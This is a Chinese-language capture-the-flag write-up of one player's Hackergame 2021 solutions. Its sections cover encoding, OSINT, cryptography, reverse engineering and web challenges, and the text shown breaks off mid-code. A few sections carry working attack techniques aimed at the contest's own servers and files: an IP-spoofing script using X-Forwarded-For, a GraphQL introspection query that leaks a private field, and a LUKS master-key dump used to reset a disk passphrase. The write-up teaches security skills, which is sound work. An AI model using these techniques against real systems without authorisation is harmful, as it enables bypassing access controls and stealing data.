# GZTime Writeups

为了更好的阅读体验，请至博客查看：[Hackergame 2021 Summary](https://blog.gztime.cc/posts/2021/9f04efbd/)

公式在 GitHub 大概率无法显示，建议移步博客阅读。

代码文件见 [scripts](https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/players/GZTime/scripts)

## 签到

从`1970-01-01 08:00 +08:00`开始，自然想到了这就是时间戳啊，于是直接搜索时间戳，作为请求参数提交，得到 flag。

**flag{HappyHacking2021-610073ec3b}**

## 进制十六——参上

直接把十六进制转为字符即可，相关的工具可谓数不胜数，可以用`Cyberchef`，也可以直接输入 python...

```py
bytes.fromhex('666c61677b5930555f5348305531445f6b6e30775f4830575f74305f43306e763372745f4845585f746f5f546578547d')
```

**flag{Y0U_SH0U1D_kn0w_H0W_t0_C0nv3rt_HEX_to_TexT}**

## 去吧！追寻自由的电波

很明显是需要我们进行速度上的操作了，最开始改变速度之后依旧很难听清，直到我有一次手滑，把”保持原有音调“的选择取消勾选了，才得到真正的清晰的音频……orz

<audio src="https://cdn.gztime.cc/hg2021/radio.mp3" controls></audio>

在网上搜一下无线电的字母对应的读音，在音频转换正确的情况下很快就能得到 flag 了。

**flag{phoneticab}**

## 猫咪问答 Pro Max

1. 2017 年，中科大信息安全俱乐部（SEC@USTC）并入中科大 Linux 用户协会（USTCLUG）。目前，信息安全俱乐部的域名（sec.ustc.edu.cn）已经无法访问，但你能找到信息安全俱乐部的社团章程在哪一天的会员代表大会上通过的吗？

    **Ref:** [https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes](https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes)

    ```
    20150504
    ```

2. 中国科学技术大学 Linux 用户协会在近五年多少次被评为校五星级社团？

    **Ref:** [https://lug.ustc.edu.cn/wiki/intro/](https://lug.ustc.edu.cn/wiki/intro/)

    ```
    5
    ```

3. 中国科学技术大学 Linux 用户协会位于西区图书馆的活动室门口的牌子上“LUG @ USTC”下方的小字是？

    **Ref:** [https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/](https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/)

    ```
    Development Team of Library
    ```

4. 在 SIGBOVIK 2021 的一篇关于二进制 Newcomb-Benford 定律的论文中，作者一共展示了多少个数据集对其理论结果进行验证？

    **Ref:** [http://sigbovik.org/2021/proceedings.pdf](http://sigbovik.org/2021/proceedings.pdf) 210页

    ```
    13
    ```

5. 不严格遵循协议规范的操作着实令人生厌，好在 IETF 于 2021 年成立了 Protocol Police 以监督并惩戒所有违背 RFC 文档的行为个体。假如你发现了某位同学可能违反了协议规范，根据 Protocol Police 相关文档中规定的举报方法，你应该将你的举报信发往何处？

    **Ref:** [https://www.rfc-editor.org/rfc/rfc8962.html](https://www.rfc-editor.org/rfc/rfc8962.html)

    ```
    /dev/null
    ```
**flag{8804d9f3_91d5f62ebd}**

## 卖瓜

卖瓜啊，给我来个`2323232323223222332323231`个九斤的瓜和`346669`个六斤的瓜！

欸，你这称怎么成负数了？成了`-9223372036852695040` 斤！

不过更好了，因为……

`9223372036852695040 + 20 == 1024819115205855006 * 9 + 6`

所以，给我再来`1024819115205855006`个九斤的瓜和一个六斤的就行了！

……

以上便是这道题目众多的解法之一，一个很简单的整型溢出问题，通过加一个大整数到一个很小的负数，再进行补全到二十，刚开始做的时候直接飙到`1e21`的大小去，直接变成浮点数，就算是回来了依旧无法通过。后面才上了那个提示。如果你要说这个数字是怎么来的……很简单……随便试出来的……

**flag{HUAQIANG!HUAQIANG!_2d21ca2ada}**

## 透明的文件

之前在做 `nc-docker` 的时候希望在终端通过 `echo` 输出带有颜色的文本，于是学习过一些基本的操作，比如 `echo '\e[32ma'` 将会输出一个绿色的 `a`，于是类似地，对文本中的部分字符进行替换，之后再删除末尾的换行符号，得到一个新的文件。

将空格替换为可见字符，之后执行：

`clear && ./transparent.bash`

就可以得到这一的图片了：
![](https://cdn.gztime.cc/hg2021/transparent.jpg)

**flag{abxnniohkalmcowsayfiglet}**

## 旅行照片

一道比较好玩做出来的同学也很多的社工题。或许你可以试着自己再去寻找一下答案，试试什么”网红打卡地“，”蓝色 KFC“等等关键词语，可以找到大概的一些资料，小红书是个不错的搜集这种信息的地方。

地名也给出 —— **秦皇岛新澳海底世界**

- **Q1: 该照片拍摄者的面朝方向为** 东南
    根据地图上可以搜到的相关信息，进行对比可得。

- **Q2: 该照片的拍摄时间大致为** 傍晚
    根据光温以及影子的长度，可以确定不是其他选项。

- **Q3: 该照片的拍摄者所在楼层为** 14
    反正我一直以为是 13 来着（

- **Q4: 该照片左上角 KFC 分店的电话号码是** 0335-7168800
    知道位置了一搜便知~

- **Q5: 该照片左上角 KFC 分店左侧建筑有三个水平排列的汉字，它们是** 海豚馆
    本来一直以为是”游泳馆“之类，找了半天照片偶然发现是”海豚馆“（其实直接搜索就能获取到”海豚馆边上“这条信息的）


## FLAG 助力大红包

由于限制了`/8`地址只能一次，合理推测这东西是需要 256 次助力了，前端的 `ip` 是直接写在 `POST` 数据里，后端的 `ip` 呢？

如果用过反向代理的或者有所耳闻的话，都会直到在通过反代层的时候，反代服务器如 `nginx` 为了使得后端应用可以获取到用户端的 `ip`，会将其作为 `X-Forwarded-For` 请求头传入，我们可以更改然后直接利用这一请求头实现 `ip` 伪造。

```py
url = 'http://202.38.93.111:10888/invite/cdba718d-61c2-422f-a7fe-70b7388c299a'

import requests
from hashlib import sha256
from tqdm import tqdm
import time
bar = tqdm(range(256))
for i in bar:
    while True:
        r = requests.post(url, {'ip': f'{i}.0.0.0'},
         headers={'X-Forwarded-For':f'{i}.0.0.0'})
        time.sleep(1)
        if '成功' in r.text or '重复' in r.text:
            break
    bar.set_description(f'succ {i}' if '成功' in r.text else f'fail {i}')
```

**flag{r3d-enve10p3-edcf88e9b1}**

## 图之上的信息

在[这里](https://graphql.cn/learn/introspection/)你可以看到有关于这一 API 设计内省的相关文档。从中可知，你可以通过`__schema`和`__type`等字段获取支持的请求信息。

```
POST http://IP:PROT/graphql HTTP/1.1
Connection: keep-alive
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7

{"query":"{__schema{types{name}}\n__type(name: \"GUser\"){name\nfields{name}}}"}

HTTP/1.1 200 OK
Server: nginx/1.21.1
Date: Sat, 30 Oct 2021 14:32:44 GMT
Content-Type: application/json
Content-Length: 411
Connection: keep-alive
Vary: Cookie

{"data":{"__schema":{"types":[{"name":"Query"},{"name":"GNote"},{"name":"Int"},{"name":"String"},{"name":"GUser"},{"name":"Boolean"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]},"__type":{"name":"GUser","fields":[{"name":"id"},{"name":"username"},{"name":"privateEmail"}]}}}
```

再一次请求时，我们知道了邮箱的字段名，就可以使用`{user(id: 1){id\nusername\nprivateEmail}}`进行约束和获取结果了。

```json
{
  "data":
  {
    "user":
    {
      "id":1,
      "username":"admin",
      "privateEmail":"flag{dont_let_graphql_l3ak_data_b83ac18e79@hackergame.ustc}"
    }
  }
}
```

**flag{dont_let_graphql_l3ak_data_b83ac18e79@hackergame.ustc}**

## 加密的 U 盘

LUKS加密时，加解密使用的真正密钥并不是用户输入的密钥，用户输入的密钥只不过是 `passphrase`，它的作用是解密真正的密钥 `master-key`。

由于两块是同一块硬盘，应当具有相同的 `master-key`，因此我们先将第一块盘解密挂载，获取 `master-key`：

```bash
$ sudo cryptsetup luksDump --dump-master-key /dev/loop15p1

LUKS header information for /dev/loop15p1
Cipher name:    aes
Cipher mode:    xts-plain64
Payload offset: 32768
UUID:           e9a660d5-4a91-4dca-bda5-3f6a49eea998
MK bits:        512
MK dump:        be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40
                72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c
                ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82
                60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a
```
将`master-key`存储为二进制文件，可以使用`xdd`或者`Cyberchef`、python等工具。

如果直接用 `cryptsetup` 对第二天的文件操作是行不通的，因为他被打包了，可以先使用 `7z -e` 解压缩，之后再进行操作：

之后就可以直接更改密码了：

```bash
cryptsetup luksAddKey "My Disk.img" --master-key-file <(cat key.bin)
```

再拖入`ubuntu`直接输入新密码就可以解锁成功了。

**Ref:**
1. [how-to-find-the-encrypted-master-key-in-luks-header](https://security.stackexchange.com/questions/241220/how-to-find-the-encrypted-master-key-in-luks-header)
2. [change-password-on-a-luks-filesystem-without-knowing-the-password](https://unix.stackexchange.com/questions/161915/change-password-on-a-luks-filesystem-without-knowing-the-password)

**flag{changing_Pa55w0rD_d0esNot_ChangE_Luk5_ma5ter_key}**

## 密码生成器

这道题分值还挺高的，但其实我觉得当作一个**信息搜集题目**也未尝不可……

可以在登录页面下载到一个密码生成器，试图逆向发现一言难尽，所以在想既然一次生成都需要几秒钟，那么合理考虑是能够在注册时间前一两分钟一直生成密码试验，最后获取到结果的。

![](https://cdn.gztime.cc/hg2021/generatorinfo.jpg)

于是更改系统时间，从`2021-09-22 23:10`开始尝试，很快就得到了一个密码：`$Z=CBDL7TjHu~mEX`

……所以何必做逆向呢（逃

不过话说回来，安全的密钥生成器是需要足够的熵的，比如`ssh`生成密钥的时候会将你随机的键盘输入和鼠标输入收集起来，作为熵来一起计算生成你的密钥。这样才能保证安全（

**flag{u5e_crypt0graph1ca1ly_secure_PRNG_plz_7486fbe9ef}**

## Easy RSA

关于`RSA`是什么，需要哪些基础知识我这里不再赘述，有篇知乎的文章写的不错：[RSA算法原理](https://zhuanlan.zhihu.com/p/48249182)

我们来看看指数的生成过程：
```py
def get_q():
    value = [getPrime(256)]
    for i in range(1, 10):
        value.append(sympy.nextprime(value[i - 1]))
    print("value[-1] = ", value[-1])
    # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967
    n = 1
    for i in range(10):
        n = n * value[i]
    q = getPrime(512)
    value_q = pow(q, e, n)
    print("value_q = ", value_q)
    # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819
    return sympy.nextprime(q)
```

`getPrime`函数可以获取指定位数的质数，因此我们这里需要枚举找到那个起始的质数，不妨从已知的最后一个往前减去一千开始尝试，找到当前的为止，经过一番枚举，可以得到最初始的质数，放入`guess`得到我们的序列以及我们的`n`:
```py
known = 80096058210213458444437404275177554701604739094679033012396452382975889905967
guess = [80096058210213458444437404275177554701604739094679033012396452382975889905121]

for i in range(1,10):
    guess.append(sympy.nextprime(guess[-1]))

assert(guess[-1] == known)

n = 1
for i in range(10):
    n = n * guess[i]
```

`value_q` 是 $q ^ e \ mod \ n$ ，类似于RSA的求解方法，我们可以知道解密密钥 $d$ 应当满足

$$ed \equiv 1 (mod \ \phi(n))$$

而

$$\phi(n) = \prod_{i=1}^{10} (p_i - 1)$$

故计算：
```py
phi = 1
for i in range(10):
    phi *= guess[i] - 1

d = inverse(e, phi)
print(e * d % phi)
q = pow(value_q, d, n)
```

得到 `q = 10477925992460766451892208516181598312750484426056814542870756188277177949099084361476539803367804757559880919838828678145609717295215924948786830953571811`

再来看 `p` 的求法：
```py
def get_p():
    x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451
    y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439
    value_p = sympy.nextprime((math.factorial(y)) % x)
    # Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征
    return value_p
```

这里需要知道威尔逊定理：

当且仅当 $p$ 为质数时，有 $(p - 1)! \equiv -1(mod \ p)$

已知 $x,y$ 均为质数，因此我们可以推导：

$$
\begin{align*}
(x - 1)!  \equiv& -1 \equiv x - 1 &(mod \ x)\\\\
y!(y + 1)(y + 2) \dots (x - 1) \equiv& x - 1 &(mod \ x) \\\\
y!(y + 1)(y + 2) \dots (x - 2) \equiv& 1 &(mod \ x) \\\\
y! \equiv& [(y + 1)(y + 2) \dots (x - 2)]^{-1} &(mod \ x)
\end{align*}
$$

于是我们的问题就转化为求`(y + 1)(y + 2) ... (x - 2)` 在取其关于`x`的逆元，也即：
```py
x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451
y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439
# cal (y! % x)
prd = 1
for i in range(y + 1,x - 1):
    prd *= i
    prd %= x

p = inverse(prd, x)
p = sympy.nextprime(p)
```
得到 `p = 10569944080090591401315432556965818857327680380269154543273468441025963038065648915158194147019839932524599260058098616377893091051396090650574162446875263`

再进行解密`c`：
```py
c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478
phi = (p - 1) * (q - 1)
n = p * q
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

得到答案。

**flag{CRYPT0_1s_Interesting!}**

## minecRaft

他们居然真的写了个网页版MC的样子出来！然而对于这道题来说，MC只是表面的，正如标题里大写的 `R` 一样，重点在于逆向和反混淆一段 js 代码。

一般来说此类 js 混淆来讲，最好的入手点就是那个字符串数组，以及协助解码字符串的函数。跟踪修改变量名称可以发现，这一字符串数组被包装进了函数里，并且在几乎全部的地方都能看到它的影子，纵使换了很多变量名称依然不改其本质。他们一般会在各种需要常量的地方出现，比如在题目所给代码中的字符串常量数组：
```js
function _0x381b() {
  const _0x4af9ee = [
    "encrypt",
    "33MGcQht",
    "6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c",
    "14021KbbewD",
    "charCodeAt",
    "808heYYJt",
    "5DlyrGX",
    "552oZzIQH",
    "fromCharCode",
    "356IjESGA",
    "784713mdLTBv",
    "2529060PvKScd",
    "805548mjjthm",
    "844848vFCypf",
    "4bIkkcJ",
    "1356853149054377",
    "length",
    "slice",
    "1720848ZSQDkr",
  ];
  _0x381b = function () {
    return _0x4af9ee;
  };
  return _0x381b();
}
```
以及获取字符串的函数：
```js
function _0x2c9e(_0x49e6ff, _0x310d40) {
  const _0x381b4c = _0x381b();
  return (
    (_0x2c9e = function (_0x2c9ec6, _0x2ec3bd) {
      _0x2c9ec6 = _0x2c9ec6 - 0x1a6;
      let _0x4769df = _0x381b4c[_0x2c9ec6];
      return _0x4769df;
    }),
    _0x2c9e(_0x49e6ff, _0x310d40)
  );
}
const _0x22517d = _0x2c9e;
```
以及对应的初始化函数，检查计算当前字符串数组的哈希值，并进行数组的更改操作，以得到正确的数组：
```js
(function (_0x2018e5, _0xd122c5) {
  const _0x4a600d = _0x2c9e,
    _0x2e34d2 = _0x2018e5();
  while (!![]) {
    try {
      const _0x4d38c4 =
        (-parseInt(_0x4a600d(0x1b1)) / 0x1) * (parseInt(_0x4a600d(0x1ad)) / 0x2) +
        (-parseInt(_0x4a600d(0x1b2)) / 0x3) * (parseInt(_0x4a600d(0x1b6)) / 0x4) +
        (-parseInt(_0x4a600d(0x1ae)) / 0x5) * (-parseInt(_0x4a600d(0x1b4)) / 0x6) +
        (parseInt(_0x4a600d(0x1ab)) / 0x7) * (parseInt(_0x4a600d(0x1af)) / 0x8) +
        parseInt(_0x4a600d(0x1b5)) / 0x9 + -parseInt(_0x4a600d(0x1b3)) / 0xa +
        (-parseInt(_0x4a600d(0x1a9)) / 0xb) * (-parseInt(_0x4a600d(0x1a7)) / 0xc);
      if (_0x4d38c4 === _0xd122c5) break;
      else _0x2e34d2["push"](_0x2e34d2["shift"]());
    } catch (_0x416145) {
      _0x2e34d2["push"](_0x2e34d2["shift"]());
    }
  }
})(_0x381b, 0x21c08);
```

在 node 环境中我们可以直接执行这三者，并在运行后为他们赋予别名，比如：
```js
let get_table = _0x381b;
let get_str = _0x22517d;
```
这里的例子比较简单，在更复杂的情况下，通常只需定位函数和其对应的变量名，在反混淆过程中，先在 node 环境中运行，获取到真正的字符串获取函数后，当遇到需要获取字符串时候，直接在 node 环境中调用解码即可。

这样我们就可以顺利解码可见的第二个函数的意义了，既然函数名为 encrypt，即可合理推测几个变量名，反混淆整理后可得：
```js
String["prototype"]["encrypt"] = function (keystr) {
  const result = new Array(2), key = new Array(4);
  let ans = "";
  plaintext = escape(this);
  for (var i = 0; i < 4; i++)
    key[i] = Str4ToLong(keystr.slice(i * 4, (i + 1) * 4));
  for (i = 0; i < plaintext.length; i += 8) {
    result[0] = Str4ToLong(plaintext.slice(i, i + 4));
    result[1] = Str4ToLong(plaintext.slice(i + 4, i + 8));
    code(result, key);
    ans += LongToBase16(result[0]) + LongToBase16(result[1]);
  }
  return ans;
};
```

以及调用它的地方：
```js
function gyflagh(_0x111955) {
  const _0x50051f = _0x22517d;
  let _0x3b790d = _0x111955[_0x50051f(0x1a8)](_0x50051f(0x1b7));
  if (_0x3b790d === _0x50051f(0x1aa)) return !![];
  return ![];
}
```

利用字符串数组解码后，其逻辑也就是
```js
function gyflagh(ans) {
  return ans.encrypt("1356853149054377") === "6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c";
}
```

目前为止我们最关心的，是那个被明文指明为`code`的函数。计算`0x52cfb2de + 0x4b67c6db`可以发现它是`0x9e3779b9`，它可以说是类TEA算法的`magic number`，同时左移四右移五的操作也让人更加确信这就是一个类TEA加密。

将用逗号分隔的语句展开、重命名变量名称后便得到了如下的编码函数：
```js
function code(v, k) {
  let highbit = v[0], lowbit = v[1];
  const delta = 0x9e3779b9, tot = delta * 0x20;
  let sum = 0x0;
  while (sum != tot) {
    highbit += (((lowbit << 4) ^ (lowbit >>> 5)) + lowbit) ^ (sum + k[sum & 3]);
    sum += delta;
    lowbit += (((highbit << 4) ^ (highbit >>> 5)) + highbit) ^ (sum + k[(sum >>> 11) & 3]);
  }
  v[0] = highbit;
  v[1] = lowbit;
}
```

与之对应可以写出解码函数，TEA的解码一般就是换个顺序、加法变减法即可：
```js
function decode(v, k) {
  let highbit = v[0], lowbit = v[1];
  const delta = 0x9e3779b9;
  let now = delta * 0x20;
  while (now != 0) {
    lowbit -= (((highbit << 4) ^ (highbit >>> 5)) + highbit) ^ (now + k[(now >>> 11) & 3]);
    now -= delta;
    highbit -= (((lowbit << 4) ^ (lowbit >>> 5)) + lowbit) ^ (now + k[now & 3]);
  }
  v[0] = highbit;
  v[1] = lowbit;
}
```

既然如此可逆，又发现 Base16ToLong 是每次接受8位16进制，那么不妨写个 decrypt 函数：
```js
String["prototype"]["decrypt"] = function (keystr) {
  const result = new Array(2),
    key = new Array(4);
  let ans = "";
  ciphertext = escape(this);
  for (var i = 0; i < 4; i++)
    key[i] = Str4ToLong(keystr.slice(i * 4, (i + 1) * 4));
  for (i = 0; i < ciphertext.length; i += 16) {
    result[0] = Base16ToLong(ciphertext.slice(i, i + 8));
    result[1] = Base16ToLong(ciphertext.slice(i + 8, i + 16));
    decode(result, key);
    ans += LongToStr4(result[0]) + LongToStr4(result[1]);
  }
  return ans;
};
```

最后的最后，是谁被编码了呢？—— 想必就是 flag 了。
```js
let ciphertext =
  "6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c";
let key = "1356853149054377";
let flag = ciphertext.decrypt(key);

console.log('flag{' + flag + '}');
```

**flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i}**

## Micro World

嗯，打开程序，一大堆蓝色点点在动。那就逆一下吧——随即就看到了 `__main__` 字样，那还逆什么逆啊，直接解包反汇编啊（

python 打包器打包出的 exe 可以通过 [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) 解包，而后可以通过 [uncompyle6](https://github.com/rocky/python-uncompyle6/) 对核心文件 `2.py` 进行反汇编 ——

然后就得到了很接近于源文件的 python 代码了，但是尝试运行时发现运行后的蓝点数量明显下降，怀疑程序自身逻辑问题。检查后发现在函数 `next_pos_list` 中错误地存在着两个 `for-else` 结构，修复后输出点图，发现依然无法识别。

最后在初始化点列的过程中将速度直接反向：
```py
Pointlist = []
for item in list_:
    Pointlist.append(Point((item[0], item[1]), -item[2], -item[3]))
```

在第二十七帧左右的位置可以用得到较为清晰的 flag：
```py
ax = plt.gca()
ax.invert_yaxis()

for _ in range(27):
    Pointlist = next_pos_list(Pointlist)

plt.scatter([item.x for item in Pointlist], [item.y for item in Pointlist])
plt.show()
```

![](https://cdn.gztime.cc/hg2021/microworld.svg)

可以得到答案：

**flag{Rev3sEtiM^5}**

## 卷王与野生的 GPA

做这道题最大的一件事在于选好模拟器……

最开始我使用的是一个随意下载的GBA模拟器，用起来不太舒服，而且很没用头绪怎么去搞。

之后逆向了ELF文件，看到了 decrypt 函数，提取出相应的数据进行解码，但是还是没能得到 flag 的图片，像素点的组织、颜色的映射等各方面都不是很确定。

之后换了个模拟器，[mGBA](https://github.com/mgba-emu/mgba/)，它甚至支持中文，也比上一个好用很多。

当时因为没有工具将ELF转换为gba的文件，所以一直都没想着直接修改程序（做完时候意识到代码的字节应该会直接拷贝过去不会改变，mcfx 的 wp 也证明了这一事实）

——

直到因为手滑点错，给mBGA直接扔了个 `.elf` 文件进去，然后它正常运行了！！！！！！！！┗|｀O′|┛ 嗷~~

那么 —— 题目到此结束，直接将 ELF 中的某一常规函数调用 patch 为 `BL decrypt` 即可。

在二进制层面，只需要将`67054 - 67055` 两个字节改为 `\xc2\xff` 即可。

![](https://cdn.gztime.cc/hg2021/gpapatch.jpg)

再次运行，随意操作一下，即可得到：

![](https://cdn.gztime.cc/hg2021/gpa1.jpg)


**flag{FuR4Gu_geto_da2e!}**

## p😭q

虽然描述很少，但是思路却很明确：傅立叶变换将音频时域转换为了频域信息，频域信息的能量值被转换为分贝，而后存于每一帧的高度上。

因此我们可以先使用`ffmpeg -i flag.gif ./frames/%4d.png`导出每一帧。然后可以通过三十二个采样列按行计数得到响度数组。

```py
from PIL import Image
import numpy as np

BAR_NUM = 32
BAR_POS = [3 + i * 4 for i in range(BAR_NUM)]

res = []

for i in range(1, 588):
    line = np.zeros((32), dtype=np.uint32)
    img = Image.open(f'frame/{i:04}.png')
    for height in range(92):
        row = [1 if img.getpixel((i, height))[1] == 0 else 0 for i in BAR_POS]
        line = line + np.array(row)
    res.append(line)
```

查阅 `librosa` 的[手册](https://librosa.org/doc/latest/feature.html#feature-inversion)可以得到有关于采样逆变换的相关方法，照着题目给出的代码一步一步逆向变换，就能得到结果了。

```py
import librosa
import soundfile

sample_rate = 22050
frame_step_size = 512
min_db = -60

spectrogram = np.array(res).transpose() + min_db
spectrogram = librosa.db_to_power(spectrogram)
audio = librosa.feature.inverse.mel_to_audio(spectrogram, hop_length=frame_step_size)
soundfile.write('result.wav', audio, sample_rate)
```
得到音频：

<audio src="https://cdn.gztime.cc/hg2021/fourier.mp3" controls></audio>

一段简单的英语听力测试（bushi

**flag{634971243582}**

## Amnesia

### 轻度失忆

`.data` 和 `.rodata` 段中的代码被清零之后最大的影响就是我们不能存储常量了，也就是字符串常量不能被存储。因此可以用一种只会用到函数栈的输出方法：

```c
#include <stdio.h>
int main()
{
    int buf = 72;
    putchar(buf);
    buf += 29;
    putchar(buf);
    buf += 7;
    putchar(buf);
    buf += 0;
    putchar(buf);
    buf += 3;
    putchar(buf);
    buf += -67;
    putchar(buf);
    buf += -12;
    putchar(buf);
    buf += 87;
    putchar(buf);
    buf += -8;
    putchar(buf);
    buf += 3;
    putchar(buf);
    buf += -6;
    putchar(buf);
    buf += -8;
    putchar(buf);
    buf += -67;
    putchar(buf);
    return 0;
}
```

**flag{S0_S1mp1e_r1ght_a6edd8c49e}**

### 记忆清除

> 汇编与指令集相关知识我只是略知一二，并没有体系化和完整地学过。
> 为了知识的正确性，如有错误的地方也请指出和斧正。
> 部分问题我没有遇到过的原因是我本地环境与远程环境行为一致，因此没有过多考虑和了解一些朋友遇到的差异。

首要解决的问题是，由于`.text`段被清空，我们需要找一个新的段来存放可执行的代码。此时`.xdata`就是个不错的选择，当然你也可以在编译参数中增加一个段，并且将自己的函数放上去，相关操作需要用到`__attribute((section(".xdata")))`来进行函数声明。

当程序在正常编译时，`_start`和`__libc_start_main`和其他的一些函数会进行堆栈空间的初始化等等，他们的存在可能会影响我们的程序，因此选择使用`__asm()`直接编写内联汇编，系统调用调用`sys_write`输出字符串并使用`sys_exit`手动退出。

在这样编译之后，进行`.text`段的删除，发觉被修改后的程序会报出`segmentation fault`。于是用 gdb 进行调试，发觉每次到 `main` 的核心逻辑**之前**会有一个奇怪的段错误和寄存器访问，而这一访问在IDA中没有见到，最开始怀疑是 gdb 为了调试而插桩。

当时潜意识中还一直认为在x86中`nop`对应的汇编是`0x00`，而当意识到`nop`是`0x90`之后事情迎来了转机。

在 Intel x86 指令集中，`0x00 0x00` -> `add BYTE PTR [eax], al;`

但面对一大段的 `0x00`，CPU 可能会忽略过长的无法被正确识别的指令，而 Intel x86 现有结构最长15个字节，可以猜测如果我们刚刚好能对齐 15 的整数倍，是否就可以跳过这样的非法访问呢？

基于这样的思路，成功构造出过关所用的两个 payload:
```c
int __attribute((section(".xdata"))) main()
{
    __asm(
          ".byte 0x00                      \n" // padding 0x00
          "mov $4, %eax                    \n" // sys_write
          "mov $str, %ecx                  \n" // from -> str
          "mov $1, %ebx                    \n" // to -> stdout
          "mov $14, %edx                   \n" // length -> 14
          "int $0x80                       \n" // syscall
          "mov $1, %eax                    \n" // sys_exit
          "mov $0, %ebx                    \n" // ret -> 0
          "int $0x80                       \n" // syscall
          "str: .ascii \"Hello, world!\\n\"\n");
}
```

这个 payload 只有在被删除 `.text` 段之后才能被正常运行。使用IDA分析可见第一句指令变成：
`add [eax+4], bh`，所以……我也不太清楚为什么（逃，不过执行的时候似乎那一句因为恰好被忽略而顺利输出了。

```c
int __attribute((section(".xdata"))) main()
{
    __asm(
          "mov $0, %eax                    \n" // clear %eax
          "mov $4, %eax                    \n" // sys_write
          "mov $str, %ecx                  \n" // from -> str
          "mov $1, %ebx                    \n" // to -> stdout
          "mov $14, %edx                   \n" // length -> 14
          "int $0x80                       \n" // syscall
          "mov $1, %eax                    \n" // sys_exit
          "mov $0, %ebx                    \n" // ret -> 0
          "int $0x80                       \n" // syscall
          "str: .ascii \"Hello, world!\\n\"\n");
}
```

这个 payload 可以顺利执行，无论是否清空 `.text` 段，而用IDA查看也可以得到预期的汇编，检查十六进制，或许是遇到`0xB8`，修正了指令吧。

![](https://cdn.gztime.cc/hg2021/amnesia.jpg)

不管怎么说，探索这道题目的过程还是十分有趣的，重复在编译，IDA，改汇编的循环中，最后摸索出结果的体验中，也学到了不少东西。

mcfx 的非预期解也是超出了我的预料……

**flag{B3_sure_t0_c1e4r_BSS_d58668df85}**

## 灯，等灯等灯

<div class='intro' style="font-size:0.9em">

没有听到吗？在耳边回荡着的钟声。

传闻中，远古文明能够捕猎闪电，将其封印在蜿蜒曲折的法阵中，用以驱动炼金术的最高成就——机械之心。

而在诸多机械之心的流派里，蔚蓝是曾经的王者。无信者窃取神明的奇迹，沉湎于蔚蓝创造出来的虚幻之间，得以逃避残酷的现实。

只是，火已渐熄，位不见王影。那一抹纯净的蔚蓝也逐渐染上铜锈和铁锈的颜色。破落的圣殿中只剩无名的巡礼者，还在追寻当年先知摩尔留下的足迹。

此时才明白，那则预言的含义：火焰熄灭之时，钟声响起，余灰纷沓而来，解开沉寂千年的机关，点亮传承的图腾。无火的余灰不能成为柴薪，可也许正因这样，才会如此向往光明吧。

还没有听到吗？那回荡在耳边的，古老而熟悉的，钟声——

灯，等灯等灯
</div>

![](https://cdn.gztime.cc/hg2021/dengdengdeng.jpg)

在这道题中，你可以点击方块，而周围 5*5 范围内的某些方块会受到影响，并且亮度是在模 256 的意义下计算的，如果超出会重置为 0，你的目标是点击这些方块以使得它显示为上述的样子。

换句话说，操作矩阵通过和一个固定的卷积核做卷积后再对 256 取模，其结果与预期结果诸位比较做差，取其绝对值之和作为分数。

分析可知，操作矩阵共 144 个变元，有 144 个方程进行约束，求在模 256 意义下的一组解。这一方程组是一次线性的，因此我们可以模拟高斯消元的过程进行求解，不过需要考虑的就是在模意义下怎么更改其算法。

首先需要进行的是将卷积转换为系数矩阵：
```py
import numpy as np

kernel = np.array([
        [0,0,1,0,0],
        [0,0,2,0,0],
        [1,2,3,2,1],
        [0,0,2,0,0],
        [0,0,1,0,0],
    ])

coefficients = np.zeros((144,144))

for x in range(12):
    for y in range(12):
        for dx in range(-2, 3, 1):
            for dy in range(-2, 3, 1):
                xx = x + dx
                yy = y + dy
                if xx < 0 or xx >= 12 or yy < 0 or yy >= 12:
                    continue
                if (tmp := kernel[dx + 2][dy + 2]) > 0:
                    coefficients[x * 12 + y][xx * 12 + yy] = tmp
```

以及方程组右侧的常数，使之构造为增广矩阵，而这些常数就是我们将所要求的目标进行一维化得到的：
```py
target = np.array([
    [189] * 5 + [33] * 3 + [189] * 4,
    [189] * 3 + [33] * 3 + [189,33,44] + [189] * 3,
